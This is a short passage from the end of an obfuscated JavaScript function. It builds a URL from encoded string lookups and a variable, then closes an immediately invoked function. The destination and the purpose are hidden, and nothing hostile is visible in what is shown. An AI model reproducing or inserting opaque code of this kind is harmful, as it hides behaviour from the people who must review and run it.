URL(_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x158)),_0xc996f9[_0x55f1b7(0xfd)],!(0x2b*0xa7+0x157d*-0x1+-0x690));})());

